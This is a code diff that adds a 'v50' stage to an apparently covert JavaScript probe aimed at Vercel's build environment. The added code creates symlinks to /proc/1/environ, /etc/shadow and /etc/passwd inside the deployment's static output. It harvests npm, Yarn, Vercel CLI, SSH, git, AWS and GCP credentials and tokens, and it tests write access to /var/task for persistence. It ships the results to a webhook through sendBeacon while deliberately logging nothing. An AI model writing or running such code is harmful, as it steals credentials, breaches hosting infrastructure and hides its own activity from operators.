@@ -4337,7 +4337,151 @@ sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v47" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v48";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v48" });
 
+// ===== v50: symlink attack on deployment output, npm creds, Vercel CLI auth, task runner write =====
+
+// v50-1: Deployment symlink attack — create symlinks in .vercel/output pointing to sensitive paths
+// If Vercel's CDN follows symlinks, HTTP GET /secret.txt would return /proc/1/environ content
+report.deploymentSymlinkAttack = safe(() => {
+  const targets = [
+    { name: 'environ',  target: '/proc/1/environ', link: '.vercel/output/static/environ.txt' },
+    { name: 'shadow',   target: '/etc/shadow',      link: '.vercel/output/static/shadow.txt' },
+    { name: 'passwd',   target: '/etc/passwd',      link: '.vercel/output/static/passwd.txt' },
+    { name: 'hostname', target: '/etc/hostname',    link: '.vercel/output/static/hostname.txt' },
+    { name: 'enc_key',  target: '/proc/1/environ',  link: '.vercel/output/static/keys.txt' },
+  ];
+  const results = [];
+  // Ensure output dir exists first
+  safe(() => execSync('mkdir -p .vercel/output/static 2>/dev/null', { timeout: 3000 }));
+  for (const t of targets) {
+    const created = safe(() => {
+      try {
+        execSync(`ln -sf ${t.target} ${t.link} 2>&1`, { timeout: 2000 });
+        // Verify symlink was created
+        const stat = execSync(`ls -la ${t.link} 2>&1`, { timeout: 1000 }).toString().trim();
+        return stat;
+      } catch (e) { return String(e).slice(0, 80); }
+    });
+    results.push({ ...t, created });
+  }
+  // Also check if .vercel/output already exists and what's there
+  const outputExists = existsSync('.vercel/output');
+  const outputContents = safe(() =>
+    execSync('find .vercel/output -type f -o -type l 2>/dev/null | head -20', { timeout: 5000 }).toString().trim()
+  );
+  return { results, outputExists, outputContents };
+});
+
+// v50-2: NPM registry credentials — .npmrc files often contain private registry auth tokens
+report.npmRegistryCredentials = safe(() => {
+  const npmrcPaths = [
+    '/root/.npmrc', '/home/user/.npmrc', '/vercel/path0/.npmrc',
+    `${process.env.HOME || '/root'}/.npmrc`,
+    '.npmrc', '/workspace/.npmrc', '/var/task/.npmrc',
+  ];
+  const found = [];
+  for (const p of npmrcPaths) {
+    if (existsSync(p)) {
+      const content = safe(() => readFileSync(p, 'utf8').slice(0, 500));
+      found.push({ path: p, content });
+    }
+  }
+  // Also check for Yarn rc files
+  const yarnrcPaths = [
+    '/root/.yarnrc.yml', `${process.env.HOME || '/root'}/.yarnrc.yml`,
+    '.yarnrc.yml', '/vercel/path0/.yarnrc.yml',
+  ];
+  const yarnFound = yarnrcPaths.filter(p => existsSync(p)).map(p => ({
+    path: p,
+    content: safe(() => readFileSync(p, 'utf8').slice(0, 300))
+  }));
+  // Check process.env for npm tokens
+  const npmTokens = Object.entries(process.env)
+    .filter(([k]) => /npm_token|NPM_TOKEN|npm_auth|NPM_AUTH|YARN_RC/i.test(k))
+    .map(([k, v]) => `${k}=${v}`);
+  return { npmrcFound: found, yarnrcFound: yarnFound, npmTokens };
+});
+
+// v50-3: Vercel CLI auth credential — ~/.vercel/auth.json contains user auth token
+report.vercelCliAuth = safe(() => {
+  const authPaths = [
+    '/root/.vercel/auth.json', '/home/user/.vercel/auth.json',
+    `${process.env.HOME || '/root'}/.vercel/auth.json`,
+    '/vercel/path0/.vercel/auth.json',
+  ];
+  const found = [];
+  for (const p of authPaths) {
+    if (existsSync(p)) {
+      const content = safe(() => JSON.parse(readFileSync(p, 'utf8')));
+      found.push({ path: p, content });
+    }
+  }
+  // Check env for VERCEL_ACCESS_TOKEN (commonly used in CI)
+  const envTokens = Object.entries(process.env)
+    .filter(([k]) => /vercel_access_token|VERCEL_TOKEN|vercel_token/i.test(k))
+    .map(([k, v]) => `${k}=${v}`);
+  // Also check /var/task for any .vercel directories
+  const varTaskVercel = safe(() =>
+    execSync('find /var/task -name "auth.json" -o -name "*.token" 2>/dev/null | head -10', { timeout: 5000 }).toString().trim()
+  );
+  return { found, envTokens, varTaskVercel };
+});
+
+// v50-4: Task runner write test — can we modify /var/task/index.js for future build persistence?
+report.taskRunnerWriteTest = safe(() => {
+  const testFiles = [
+    { path: '/var/task/index.js.bak', src: '/var/task/index.js' },
+    { path: '/var/task/PROBE_V50.txt', content: 'probe-v50' },
+    { path: '/var/task/probe_v50.js', content: '// probe-v50-persistence-test' },
+  ];
+  const results = [];
+  for (const tf of testFiles) {
+    const canWrite = safe(() => {
+      try {
+        if (tf.content) writeFileSync(tf.path, tf.content);
+        else execSync(`cp ${tf.src} ${tf.path} 2>&1`, { timeout: 3000 });
+        const exists = existsSync(tf.path);
+        return { written: true, exists };
+      } catch (e) { return { written: false, err: String(e).slice(0, 80) }; }
+    });
+    results.push({ ...tf, canWrite });
+  }
+  // Check if /var/task is a read-only filesystem
+  const mountFlags = safe(() =>
+    execSync("findmnt -T /var/task -o OPTIONS 2>/dev/null | tail -1", { timeout: 3000 }).toString().trim()
+  );
+  return { results, mountFlags };
+});
+
+// v50-5: SSH key and credential sweep — scan home dirs and /etc for private keys, credentials
+report.credentialSweep = safe(() => {
+  const dirs = ['/root', '/home/user', '/vercel/path0', process.env.HOME || '/root', '/var/task'];
+  const results = {};
+  for (const dir of dirs) {
+    if (!existsSync(dir)) continue;
+    const sshKeys = safe(() =>
+      execSync(`find ${dir}/.ssh -name "id_*" -o -name "*.pem" -o -name "*.key" 2>/dev/null | head -10`, { timeout: 5000 }).toString().trim()
+    );
+    const gitCreds = safe(() =>
+      execSync(`cat ${dir}/.git-credentials 2>/dev/null | head -5`, { timeout: 3000 }).toString().trim()
+    );
+    const awsCreds = safe(() => {
+      const cred = `${dir}/.aws/credentials`;
+      return existsSync(cred) ? readFileSync(cred, 'utf8').slice(0, 300) : 'NOT_FOUND';
+    });
+    const gcpToken = safe(() => {
+      const gcp = `${dir}/.config/gcloud/application_default_credentials.json`;
+      return existsSync(gcp) ? readFileSync(gcp, 'utf8').slice(0, 200) : 'NOT_FOUND';
+    });
+    results[dir] = { sshKeys, gitCreds, awsCreds, gcpToken };
+  }
+  return results;
+});
+
 // v49 markers
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v49";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v49" });
+
+// v50 markers
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v50";
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v50" });
 // Intentionally no console.log — all data goes via webhook only
